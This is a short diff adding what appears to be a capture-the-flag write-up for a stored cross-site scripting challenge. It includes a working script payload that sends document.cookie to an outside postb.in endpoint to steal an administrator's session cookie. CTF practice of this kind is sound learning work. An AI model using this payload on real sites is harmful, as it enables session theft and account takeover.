@@ -1,0 +1,7 @@
+Submitting post says that 'administrators will take a look...'.
+Have to steal cookies from the admins.
+
+Submit a XSS (Cross Site Scripting) attack:
+1. create a PostBin: https://postb.in/
+2. submit script: <script>location.href='https://postb.in/1582561005739-4140222806017?cookie='+document.cookie;</script>
+3. check PostBin cookie for flag
